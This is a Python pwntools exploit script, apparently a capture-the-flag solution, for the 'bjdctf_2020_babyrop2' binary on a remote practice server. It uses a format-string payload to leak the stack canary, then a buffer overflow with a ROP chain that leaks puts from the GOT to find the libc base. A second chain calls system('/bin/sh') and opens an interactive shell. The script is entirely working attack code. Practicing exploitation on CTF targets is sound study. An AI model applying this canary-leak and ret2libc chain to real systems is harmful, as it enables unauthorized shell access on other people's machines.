from pwn import *

context.log_level = 'debug'

proc_name = './bjdctf_2020_babyrop2'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 28915)
elf = ELF(proc_name)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vuln = elf.sym['vuln']

pop_rdi_ret = 0x400993
ret = 0x4005f9

#gdb.attach(p, 'b *0x400857')
#format overflow
p.recvuntil('I\'ll give u some gift to help u!\n')

payload = b'%7$p'

p.sendline(payload)

canary = int(p.recv(0x12), 16)

print('[+] canary -> {}'.format(hex(canary)))

#gdb.attach(p, 'b *0x4008c3')
p.recvuntil('Pull up your sword and tell me u story!\n')

payload = b'a' * ( 0x20 - 8 ) + p64(canary) + b'a' * 0x8 + p64(pop_rdi_ret) + p64(puts_got) 
payload += p64(puts_plt) + p64(vuln)

p.sendline(payload)

puts_real_addr = u64(p.recv(6).ljust(8, b'\0'))

libc_base = puts_real_addr - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x20 - 8 ) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) 
payload += p64(system_addr)

p.recvuntil('story!\n')

p.sendline(payload)

p.interactive()
